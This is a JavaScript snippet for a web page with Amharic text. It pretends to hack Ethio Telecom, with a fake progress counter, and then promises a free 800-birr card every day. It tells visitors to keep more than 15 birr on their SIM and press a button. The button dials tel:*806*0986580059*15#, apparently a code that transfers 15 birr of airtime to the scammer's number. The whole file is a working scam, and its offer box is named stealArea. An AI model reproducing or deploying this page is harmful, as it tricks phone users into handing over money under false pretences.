let hack = 0;
let is_running = true;
let displayArea = document.getElementById('oe893j383u38e');
if (is_running) {
  setInterval(() => {
    hack++;
    displayArea.innerHTML = `ኢትዮቴሌኮምን በተሳካ ሁኔታ ሀክ እያደረጉ ነው ${hack}%`;
  }, 200);
}
setTimeout(() => {
  displayArea = false;
  let dis = document.getElementById('oe893j383u38e');
  dis.innerHTML = 'በሚገርም ሁኔታ ኢትዮቴሌኮምን ሀክ አድርገዋል!';
  const stealArea = document.getElementById('je93j933i93');
  stealArea.innerHTML = `
    <h3>አሁን በየቀኑ የ 800 ብር ካርድ ማግኘት ይችላሉ!</h3><br><br>
    <ul>
    <li>የሚያስፈልጉ ነገሮች</li>
    <li>በ ያዙት ሲም ካርድ ላይ ከ 15 ብር በላይ መኖር አለበት አለበለዚያ አይሰራም ምክነያቱም በ እጆ የያዙት ስልክ የገባበት ስም ካርድ አክቲቭ መሆን አለበት</li>
    <li>ከላይ የተቀመጠውን ጥያቄ ካሟሉ ከታች ያለውን ጀምር ሚለውን ይጫኑ::</li>
    </ul>
    <button onclick="seePop();" class="get"><a href="tel:*806*0986580059*15#" onclick="seePop" class="geta">ጀምር</a></button>
  `;
}, 20000);
function seePop() {
  alert("አሁን በስልክ መደወያው ላይ የሚፃፈውን ቁጥር ሳይጨምሩ ሳይቀንሱ በ ኢትዮቴሌኮም ሲሞ ይደውሉ!");
};